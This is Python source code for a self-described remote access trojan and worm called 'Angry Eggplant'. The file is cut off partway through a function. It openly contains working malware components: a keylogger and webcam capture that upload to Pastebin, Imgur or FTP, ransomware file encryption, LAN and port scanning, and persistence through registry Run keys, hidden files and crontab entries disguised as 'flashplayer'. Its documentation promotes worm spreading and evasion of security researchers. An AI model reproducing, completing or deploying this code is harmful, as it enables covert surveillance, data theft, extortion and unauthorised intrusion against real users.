#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

"""
 
 
        ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,   aa       aa
        ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a  88       88
        ,adPPPPP88 88       88 8b       88 88	        8b       88
        88,    ,88 88       88 "8a,   ,d88 88	        "8a,   ,d88
        `"8bbdP"Y8 88       88  `"YbbdP"Y8 88            `"YbbdP"Y8
                                aa,    ,88 	         aa,    ,88
                                 "Y8bbdP"                 "Y8bbdP'

                                                       88                          ,d
                                                       88                          88
         ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
        a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
        8PP8888888 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
        "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
         `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
                    aa,    ,88  aa,    ,88 88                                      "Y888
                     "Y8bbdP"    "Y8bbdP"  88



                            https://github.com/colental/ae
"""

from __future__ import print_function

import os
import sys
import imp
import time
import json
import zlib
import uuid
import numpy
import base64
import ctypes
import pickle
import Queue
import struct
import socket
import random
import ftplib
import urllib
import urllib2
import zipfile
import functools
import threading
import cStringIO
import subprocess

from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256, HMAC
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.number import long_to_bytes, bytes_to_long
from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey

if os.name is 'nt':
    from pyHook import HookManager
    from pythoncom import PumpMessages
    from win32com.shell.shell import ShellExecuteEx
    from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
else:
    from pyxhook import HookManager



def config(*arg, **options):
    def decorator(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
        return wrapper
    return decorator



class Client():

    """

    THE ANGRY EGGPLANT PROJECT

         Angry Eggplant primarily acts as a remote access tool inspired by the
         Meterpreter shell of the Metasploit Project, with some major improvements.
         It is ultra-portable - it is written in pure python, has zero dependencies,
         runs on anything, requires no manual configuration, and does not require
         any downloads or installations to run - in fact, if it can't find something
         it needs, rather than raise an error or fail to run, it automatically
         downloads/installs it silently without any user interaction. This is
         convenient for the remote access tool, but the true power of this is in
         the autonomous mode which transforms the client from a reverse tcp shell
         loaded with many payloads into something more closely resembling a worm
         than a remote access tool. Operating in this mode it autonomously discovers
         and analyzes hosts to then generate, configure, and compile a unique
         encrypted deliverable for each target which acts as a stager that gains a
         foothold and acts a stager from which to download and execute the main client
         from. The client first establishes persistence with multiple methods to ensure
         redundancy. Next it seeks to discover new host machines in its local network,
         and spread itstelf to those hosts using mulitiple payload delivery vectors,
         such as email, ssh, and ftp. It does all this from memory without leaving a
         trace of evidence on the host machine's hard disk. It never connects to a
         command & control server or exposes the attacker in any way - rather it only
         will make connections with the machine that infected it and with any machines
         it subsequently infects. Finally, and most importantly, all communication over
         any network is encrypted from end-to-end with secure modern cryptography,
         thus minimizing the amount of information exposed to potential discovery by
         security researchers.

     
        Client Features:

            - 26 payloads

            - End-to-end encryption

            - Runs on Windows, Mac OS X, iOS, Linux (Android support coming soon)

            _ Automated host discovery

            - Multiple delivery vectors - email, ssh, ftp, social media, torrents, websites

            - No dependencies 

            - No configuration

            - Pure python source

            - Compiles source into native executable format for each host

            - Operates autonomously


    """

    __name__    = 'Client'
    _tasks      = Queue.Queue()
    _lock       = threading.Lock()
    _abort      = False
    _debug      = False


    def __init__(self, **kwargs):
        self._jobs          = {}
        self._results       = {}
        self._local_network = {}
        self._session       = {'connection': threading.Event()}
        self._services      = {i.split()[1][:-4]: [i.split()[0], ' '.join(i.split()[2:])] for i in open('C:\Windows\System32\drivers\etc\services' if os.name == 'nt' else '/etc/services').readlines() if len(i.split()) > 1 if 'tcp' in i.split()[1]}
        self._info          = {k:v for k,v in zip(['id', 'ip', 'local', 'platform', 'mac', 'architecture', 'username', 'administrator', 'device', 'encryption'], [Client._get_client_id(), Client._get_public_ip(), Client._get_local_ip(), sys.platform, Client._get_mac_address(), Client._is_32_or_64_bit(), Client._get_username(), Client._is_user_admin(), Client._get_device_name(), Client._get_cipher()])}
        self._commands      = {cmd: {'method': getattr(self, cmd), 'usage': getattr(Client, cmd).usage, 'description': getattr(Client, cmd).func_doc.strip().rstrip(), 'platforms': getattr(Client, cmd).platforms} for cmd in vars(Client) if hasattr(vars(Client)[cmd], 'command')}
        self._setup(**kwargs)


    @staticmethod
    def _configure(target, **kwargs):
        Client.debug(json.dumps(kwargs, indent=2))
        if hasattr(Client, target):
            for k,v in kwargs.items():
                try:
                    setattr(getattr(Client, target), k, v)
                except Exception as e:
                    Client.debug("{} returned error: {}".format(Client._configure.func_name, str(e)))


    @staticmethod
    def _post(url, headers={}, data={}):
        dat = urllib.urlencode(data)
        req = urllib2.Request(str(url), data=dat) if data else urllib2.Request(url)
        for key, value in headers.items():
            req.headers[key] = value
        return urllib2.urlopen(req).read()


    @staticmethod
    def _obfuscate(data):
        a = bytearray(reversed(bytes(data)))
        b = Client._get_nth_prime(len(a) + 1)
        c = Client._get_primes(b)
        return base64.b64encode("".join([(chr(a.pop()) if n in c else os.urandom(1)) for n in xrange(b)]))


    @staticmethod
    def _deobfuscate(block):
        return bytes().join(chr(bytearray(base64.b64decode(bytes(block)))[_]) for _ in Client._get_primes(len(bytearray(base64.b64decode(bytes(block))))))


    @staticmethod
    def _get_cipher():
        try:
            return 'aes' if bool('AES' in globals() and 'SHA256' in globals() and 'HMAC' in globals()) else 'xor'
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_cipher.func_name, str(e)))


    @staticmethod
    def _get_xor(s, t):
        try:
            return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))


    @staticmethod
    def _get_padded(s, block_size):
        try:
            return bytes(s) + (block_size - len(bytes(s)) % block_size) * chr(0)
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))


    @staticmethod
    def _get_blocks(s, block_size):
        try:
            return [s[i * block_size:((i + 1) * block_size)] for i in range(len(s) // block_size)]
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_blocks.func_name, str(e)))


    @staticmethod
    def _get_config(x):
        try:
            return urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))).read()
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))      


    @staticmethod
    def _get_connection(x, y):
        try:
            s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect((x, y))
            Client.debug("Connected to {}:{}".format(x, y))
            return s
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_connection.func_name, str(e)))
        time.sleep(5)
        return Client._get_connection(x, y)   


    @staticmethod
    def _get_primes(n):
        sieve = numpy.ones(n/3 + (n%6==2), dtype=numpy.bool)
        for i in xrange(1,int(n**0.5)/3+1):
            if sieve[i]:
                k=3*i+1|1
                sieve[       k*k/3     ::2*k] = False
                sieve[k*(k-2*(i&1)+4)/3::2*k] = False
        return numpy.r_[2,3,((3*numpy.nonzero(sieve)[0][1:]+1)|1)]


    @staticmethod
    def _get_nth_prime(p):
        try:
            return (Client._get_primes(i)[-1] for i in xrange(int(p*1.5), int(p*15)) if len(Client._get_primes(i)) == p).next()     
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_nth_prime.func_name, str(e)))


    @staticmethod
    def _get_public_ip():
        try:
            return urllib2.urlopen('http://api.ipify.org').read()
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_public_ip.func_name, str(e)))


    @staticmethod
    def _get_local_ip():
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_local_ip.func_name, str(e)))


    @staticmethod
    def _get_mac_address():
        try:
            return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_mac_address.func_name, str(e)))


    @staticmethod
    def _get_username():
        try:
            return os.getenv('USER', os.getenv('USERNAME'))
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_username.func_name, str(e)))


    @staticmethod
    def _get_device_name():
        try:
            return os.getenv('NAME', os.getenv('COMPUTERNAME', os.getenv('DOMAINNAME')))
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_device_name.func_name, str(e)))


    @staticmethod
    def _get_client_id():
        try:
            return SHA256.new(Client._get_public_ip() + Client._get_mac_address()).hexdigest()
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_client_id.func_name, str(e)))


    @staticmethod            
    def _get_status(c):
        try:
            c = time.time() - float(c)
            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
            return ', '.join([i for i in data if i])
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_status.func_name, str(e)))
            

    @staticmethod
    def _get_data(source):
        try:
            if os.path.isfile(str(source)):
                return open(source, 'rb').read()
            elif hasattr(source, 'getvalue'):
                return source.getvalue()
            elif hasattr(source, 'read'):
                if hasattr(source, 'seek'):
                    source.seek(0)
                return source.read()
            else:
                return bytes(source)
        except Exception as e2:
            Client.debug("{} returned error: {}".format(Client._upload_imgur.func_name, str(e2)))


    @staticmethod
    def _get_registry_key(key_name, key_value, system=False):
        try:
            key_name, key_value = [str(key_name), str(key_value)]
            run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
            SetValueEx(reg_key, key_name, 0, REG_SZ, key_value)
            CloseKey(reg_key)
            if system:
                run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
                reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
                SetValueEx(reg_key, '*' + key_name, 0, REG_SZ, key_value)
                CloseKey(reg_key)
            return True
        except Exception as e:
            Client.debug("{} returned error: {}".format(str(e)))
        return False


    @staticmethod
    def _get_png(image):
        try:
            if type(image) == numpy.ndarray:
                width, height = (image.shape[1], image.shape[0])
                data = image.tobytes()
            else:
                width, height = (image.width, image.height)
                data = image.rgb
            line = width * 3
            png_filter = struct.pack('>B', 0)
            scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
            magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
            ihdr = [b"", b'IHDR', b"", b""]
            ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
            ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
            ihdr[0] = struct.pack('>I', len(ihdr[2]))
            idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
            idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
            idat[0] = struct.pack('>I', len(idat[2]))
            iend = [b"", b'IEND', b"", b""]
            iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
            iend[0] = struct.pack('>I', len(iend[2]))
            fileh = cStringIO.StringIO()
            fileh.write(magic)
            fileh.write(b"".join(ihdr))
            fileh.write(b"".join(idat))
            fileh.write(b"".join(iend))
            fileh.seek(0)
            return fileh
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_png.func_name, str(e)))
            

    @staticmethod
    @config(client_id=None, client_secret=None)
    def _get_oauth_code():
        domain = "https://www.coinbase.com/oauth/authorize?{}"
        params = {"response_type": "code", "scope": "wallet:user:read", "client_id": Client.ransom.client_id, "client_secret": Client.ransom.client_secret, "redirect_uri": Client.ransom.redirect_uri}
        try:
            data        = urllib2.urlopen(domain.format(urllib.urlencode(params))).read()
            key, value  = ('', '')
            for line in data.splitlines():
                if 'code="' in line:
                    key, _, value = line.partition('code=')
                    value = value.split('"')[0] + '"'
                    if len(value) == SHA256.block_size:
                        break
            else:
                self.debug("No valid authorization code found in response from server ('Key': '{}', 'Value': '{}')".format(key, value))
            return value
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._get_png.func_name, str(e)))

    
    @staticmethod
    def _get_oauth_token(code):
        domain = "https://api.coinbase.com/oauth/token"
        params = {"grant_type": "authorization_code", "code": code, "client_id": Client.ransom.client_id, "redirect_uri": Client.ransom.redirect_uri}
        


    @staticmethod
    def _is_ipv4_address(address):
        try:
            if socket.inet_aton(str(address)):
                return True
        except:
            return False


    @staticmethod
    def _is_user_admin():
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._is_user_admin.func_name, str(e)))      
        

    @staticmethod
    def _is_32_or_64_bit():
        try:
            return int(struct.calcsize('P') * 8)
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._is_32_or_64_bit.func_name, str(e)))


    @staticmethod
    @config(block_size=8, key_size=16, num_rounds=32)
    def _encrypt_xor(data, key):
        try:
            data    = Client._get_padded(data, Client._encrypt_xor.block_size)
            blocks  = Client._get_blocks(data, Client._encrypt_xor.block_size)
            vector  = os.urandom(8)
            result  = [vector]
            for block in blocks:
                block   = Client._get_xor(vector, block)
                v0, v1  = struct.unpack("!2L", block)
                k       = struct.unpack("!4L", key[:Client._encrypt_xor.key_size])
                sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
                for round in range(Client._encrypt_xor.num_rounds):
                    v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
                    sum = (sum + delta) & mask
                    v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
                output  = vector = struct.pack("!2L", v0, v1)
                result.append(output)
            return base64.b64encode(b"".join(result))
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._encrypt_xor.func_name, str(e)))


    @staticmethod
    @config(block_size=8, key_size=16, num_rounds=32)
    def _decrypt_xor(data, key):
        try:
            data    = base64.b64decode(data)
            blocks  = Client._get_blocks(data, Client._decrypt_xor.block_size)
            vector  = blocks[0]
            result  = []
            for block in blocks[1:]:
                v0, v1 = struct.unpack("!2L", block)
                k = struct.unpack("!4L", key[:Client._decrypt_xor.key_size])
                delta, mask = 0x9e3779b9L, 0xffffffffL
                sum = (delta * Client._decrypt_xor.num_rounds) & mask
                for round in range(Client._decrypt_xor.num_rounds):
                    v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
                    sum = (sum - delta) & mask
                    v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
                decode = struct.pack("!2L", v0, v1)
                output = Client._get_xor(vector, decode)
                vector = block
                result.append(output)
            return "".join(result).rstrip(chr(0))
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._decrypt_xor.func_name, str(e)))


    @staticmethod
    def _encrypt_aes(plaintext, key):
        try:
            text        = Client._get_padded(plaintext, AES.block_size)
            iv          = os.urandom(AES.block_size)
            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
            ciphertext  = iv + cipher.encrypt(text)
            hmac_sha256 = HMAC.new(key[max(AES.key_size):], msg=ciphertext, digestmod=SHA256).digest()
            return base64.b64encode(ciphertext + hmac_sha256)
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._encrypt_aes.func_name, str(e)))


    @staticmethod
    def _decrypt_aes(ciphertext, key):
        try:
            ciphertext  = base64.b64decode(ciphertext)
            iv          = ciphertext[:AES.block_size]
            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
            read_hmac   = ciphertext[-SHA256.digest_size:]
            calc_hmac   = HMAC.new(key[max(AES.key_size):], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
            Client.debug('HMAC-SHA256 hash authentication check failed - transmission may have been compromised') if calc_hmac != read_hmac else None
            return cipher.decrypt(ciphertext[AES.block_size:-SHA256.digest_size]).rstrip(chr(0))
        except Exception as e:
            Client.debug("{} returned error: {}".format(Client._decrypt_aes.func_name, str(e)))


    @staticmethod
    @config(api_key=None)
    def _upload_imgur(source):
        try:
            data = Client._get_data(source)
            return json.loads(Client._post('https://api.imgur.com/3/upload', headers={'Authorization': Client._upload_imgur.api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})).get('data').get('link')
        except Exception as e2:
            Client.debug("{} returned error: {}".format(Client._upload_imgur.func_name, str(e2)))


    @staticmethod
    @config(api_dev_key=None, api_user_key=None)
    def _upload_pastebin(source):
        try:
            data = Client._get_data(source)
            info = {'api_option': 'paste', 'api_paste_code': data}
            info.update({'api_user_key': Client._upload_pastebin.api_user_key}) if hasattr(Client._upload_pastebin, 'api_user_key') else None
            info.update({'api_dev_key' : Client._upload_pastebin.api_dev_key}) if hasattr(Client._upload_pastebin, 'api_dev_key') else None
            paste = Client._post('https://pastebin.com/api/api_post.php', data=info)
            return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
        except Exception as e:
            Client.debug('{} error: {}'.format(Client._upload_pastebin.func_name, str(e)))


    @staticmethod
    @config(hostname=None, username=None, password=None)
    def _upload_ftp(source, filetype=None):
        try:
            path  = ''
            local = time.ctime().split()
            if os.path.isfile(source):
                path   = source
                source = open(source, 'rb')
            elif hasattr(source, 'seek'):
                source.seek(0)
            else:
                source = cStringIO.StringIO(bytes(source))
            host = ftplib.FTP(Client._upload_ftp.hostname, Client._upload_ftp.username, Client._upload_ftp.password)
            addr = Client._get_public_ip()
            if 'tmp' not in host.nlst():
                host.mkd('/tmp')
            if addr not in host.nlst('/tmp'):
                host.mkd('/tmp/{}'.format(addr))
            if path:
                path = '/tmp/{}/{}'.format(addr, path)
            else:
                if filetype:
                    filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
                    path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
                else:
                    path     = '/tmp/{}/{}'.format(addr, '{}-{}_{}'.format(local[1], local[2], local[3]))
            _ = host.storbinary('STOR ' + path, source)
            return path
        except Exception as e2:
            Client.debug("{} returned error: {}".format(Client._upload_ftp.func_name, str(e2)))


    @staticmethod
    @config(account_id=None, client_id=None, client_secret=None)
    def _ransom_payment():
        url = 'https://api.coinbase.com/v2/accounts/{}/addresses'.format(str(account_id))
        return


    def _ransom_encrypt(self, path):
        if os.path.splitext(str(path))[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp']:
            aes_key = SHA256.new(os.urandom(16)).hexdigest()
            ransom  = self.encrypt(path, key=aes_key)
            cipher  = PKCS1_OAEP.new(self._session['public_key'])
            key     = base64.b64encode(cipher.encrypt(aes_key))
            data    = {'file': path.replace('/', '?').replace('\\', '?'), 'key': key}
            task_id = self._task_id(self.ransom.func_name)
            task    = {'id': task_id, 'client_id': self._info['id'], 'session_id': self._session['id'], 'task': self.ransom.func_name, 'data': data}
            result  = self._encrypt(json.dumps(task) + '\n')
            self._tasks.put_nowait((self._session['ransom'].sendall, result))


    def _ransom_decrypt(self, path):
        cipher  = PKCS1_OAEP.new(self._session['private_key'])
        aes_key = cipher.decrypt(base64.b64decode(task['data']['key']))
        path    = self.decrypt(task['file'].replace('?', '/'), key=aes_key)
        remove  = self._results.pop(task_id, None)
                


    def _keylogger(self, *args, **kwargs):
        while True:
            try:
                hm = HookManager()
                hm.KeyDown = self._keylogger_event
                hm.HookKeyboard()
                if os.name is 'nt':
                    PumpMessages()
                else:
                    time.sleep(0.1)
            except Exception as e:
                self.debug('{} error: {}'.format(self._keylogger.func_name, str(e)))
                break


    def _keylogger_manager(self):
        try:
            while True:
                if self.keylogger.buffer.tell() > self.keylogger.max_bytes:
                    result  = self._upload_ftp(self.keylogger.buffer, filetype='.txt') if 'ftp' in args else self._upload_pastebin(self.keylogger.buffer)
                    task_id = self._task_id(self.keylogger.func_name)
                    task    = {'id': task_id, 'session_id': self._session['id'], 'client_id': self._info['id'], 'task': self.keylogger.func_name, 'data': result}
                    self._results[task_id] = task
                    self.keylogger.buffer.reset()
                    self._tasks.put_nowait((self._report, task))
                else:
                    time.sleep(5)
        except Exception as e:
            self.debug("{} returned error: {}".format(manager.func_name, str(e)))


    def _keylogger_event(self, event):
        try:
            if event.WindowName != vars(self.keylogger)['window']:
                vars(self.keylogger)['window'] = event.WindowName
                self.keylogger.buffer.write("\n[{}]\n".format(vars(self.keylogger)['window']))
            if event.Ascii > 32 and event.Ascii < 127:
                self.keylogger.buffer.write(chr(event.Ascii))
            elif event.Ascii == 32:
                self.keylogger.buffer.write(' ')
            elif event.Ascii in (10,13):
                self.keylogger.buffer.write('\n')
            elif event.Ascii == 8:
                self.keylogger.buffer.seek(-1, 1)
                self.keylogger.buffer.truncate()
            else:
                pass
        except Exception as e:
            self.debug('{} returned error: {}'.format(self._keylogger_event.func_name, str(e)))
        return True


    def _scan_host(self, host):
        try:
            if self._ping(host):
                for port in [21,22,23,25,53,80,110,111,135,139,143,179,443,445,514,993,995,1433,1434,1723,3306,3389,8000,8008,8443,8888]:
                    self._tasks.put_nowait((self._port, (host, port)))
                for x in xrange(10):
                    self._jobs['scanner-%d' % x] = threading.Thread(target=self._threader, name=time.time())
                    self._jobs['scanner-%d' % x].daemon = True
                    self._jobs['scanner-%d' % x].start()
                for x in xrange(10):
                    if self._jobs['scanner-%d' % x].is_alive():
                        self._jobs['scanner-%d' % x].join()
            return json.dumps(self._local_network)
        except Exception as e:
            self.debug('{} error: {}'.format(self._scan_host.func_name, str(e)))
            return '{} error: {}'.format(self._scan_host.func_name, str(e))


    def _scan_network(self, *args):
        try:
            stub = '.'.join(str(self._info['local']).split('.')[:-1]) + '.%d'
            lan  = []
            for i in xrange(1,255):
                lan.append(stub % i)
                self._tasks.put_nowait((self._ping, stub % i))
            for _ in xrange(10):
                x = len(self._jobs)
                self._jobs['scanner-%d' % x] = threading.Thread(target=self._threader, name=time.time())
                self._jobs['scanner-%d' % x].setDaemon(True)
                self._jobs['scanner-%d' % x].start()
            self._jobs['scanner-%d' % x].join()
            for ip in lan:
                self._tasks.put_nowait((self._scan_host, ip))
            for n in xrange(len(lan)):
                x = len(self._jobs)
                self._jobs['scanner-%d' % x] = threading.Thread(target=self._threader, name=time.time())
                self._jobs['scanner-%d' % x].start()
            self._jobs['scanner-%d' % x].join()
            return json.dumps(self._local_network)
        except Exception as e:
            self.debug('{} error: {}'.format(self._scan_network.func_name, str(e)))
            return '{} error: {}'.format(self._scan_network.func_name, str(e))


    def _webcam_image(self, *args, **kwargs):
        try:
            dev = VideoCapture(0)
            r,f = dev.read()
            dev.release()
            if not r:
                return "Unable to access webcam"
            png = self._get_png(f)
            return self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png, filetype='.png')
        except Exception as e:
            self.debug('{} error: {}'.format(self._webcam_image.func_name, str(e)))


    def _webcam_video(self, *args, **kwargs):
        try:
            fpath   = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}.avi'.format(random.randint(1000,9999))) if os.name is 'nt' else os.path.join('/tmp', 'tmp{}.avi'.format(random.randint(1000,9999)))
            fourcc  = VideoWriter_fourcc(*'DIVX') if os.name is 'nt' else VideoWriter_fourcc(*'XVID')
            output  = VideoWriter(fpath, fourcc, 20.0, (640,480))
            length  = float(int([i for i in args if bytes(i).isdigit()][0])) if len([i for i in args if bytes(i).isdigit()]) else 5.0
            end     = time.time() + length
            dev     = VideoCapture(0)
            while True:
                ret, frame = dev.read()
                output.write(frame)
                if time.time() > end: break
            dev.release()
            result = self._upload_ftp(fpath, filetype='.avi')
            try:
                os.remove(fpath)
            except: pass
            return result
        except Exception as e:
            self.debug('{} error: {}'.format(self._webcam_video.func_name, str(e)))


    def _webcam_stream(self, port=None, retries=5):
        try:
            if not port:
                return self.webcam.usage
            try:
                host = self._session['socket'].getpeername()[0]
            except socket.error:
                self._session['connection'].clear()
                return self.connect()
            port = int(port)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            while retries > 0:
                try:
                    sock.connect((host, port))
                except socket.error:
                    retries -= 1
                break
            if not retries:
                return 'Stream failed - connection error'
            dev = VideoCapture(0)
            try:
                t1 = time.time()
                while True:
                    try:
                        ret,frame=dev.read()
                        data = pickle.dumps(frame)
                        sock.sendall(struct.pack("L", len(data))+data)
                        time.sleep(0.1)
                    except Exception as e:
                        self.debug('Stream error: {}'.format(str(e)))
                        break
            finally:
                try:
                    dev.release()
                    sock.close()
                except: pass
        except Exception as e:
            self.debug('{} error: {}'.format(self._webcam_stream.func_name, str(e)))
            return '{} error: {}'.format(self._webcam_stream.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'])
    def _persistence_add_hidden_file(self):
        if hasattr(self, '__f__'):
            try:
                value = self._get_config(long(self.__f__))
            except:
                value = self.__f__
            if os.path.isfile(value):
                try:
                    if os.name is 'nt':
                        path = value
                        hide = subprocess.call('attrib +h {}'.format(path), shell=True) == 0
                    else:
                        dirname, basename = os.path.split(value)
                        path = os.path.join(dirname, '.' + basename)
                        hide = subprocess.call('mv {} {}'.format(value, path), shell=True) == 0
                    if hide:
                        if path != value:
                            self.__f__ = bytes(bytes_to_long(self._upload_pastebin(path)))[-21:]
                        return (True, path)
                except Exception as e:
                    self.debug('Adding hidden file error: {}'.format(str(e)))
        return (False, None)


    @config(platforms=['win32','linux2','darwin'])
    def _persistence_remove_hidden_file(self):
        if hasattr(self, '__f__'):
            try:
                filename = self._get_config(long(self.__f__))
            except:
                filename = self.__f__
            if os.path.isfile(filename):
                try:
                    unhide  = 'attrib -h {}'.format(filename) if os.name is 'nt' else 'mv {} {}'.format(filename, os.path.join(os.path.dirname(filename), os.path.basename(filename).strip('.')))
                    if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                        return True
                except Exception as e:
                    self.debug('Error unhiding file: {}'.format(str(e)))
        return False 


    @config(platforms=['linux2'])
    def _persistence_add_crontab_job(self, minutes=10, name='flashplayer'):
        if hasattr(self, '__f__'):
            try:
                value = self._get_config(long(self.__f__))
            except:
                value = self.__f__
            if os.path.isfile(value):
                try:
                    if not os.path.isdir('/var/tmp'):
                        os.makedirs('/var/tmp')
                    name = os.path.join('/var/tmp','.' + os.path.splitext(name)[0] + os.path.splitext(value)[1])
                    with file(name, 'w') as copy:
                        copy.write(open(value).read())
                    if not self.persistence.methods['crontab_job']['established']:
                        for user in ['root', os.getenv('USERNAME', os.getenv('NAME'))]:
                            try:
                                task = "0 */6 * * * {} {}".format(60/minutes, user, name)
                                with open('/etc/crontab', 'r') as fp:
                                    data= fp.read()
                                if task not in data:
                                    with file('/etc/crontab', 'a') as fd:
                                        fd.write('\n' + task + '\n')
                                return (True, name)
                            except Exception as e:
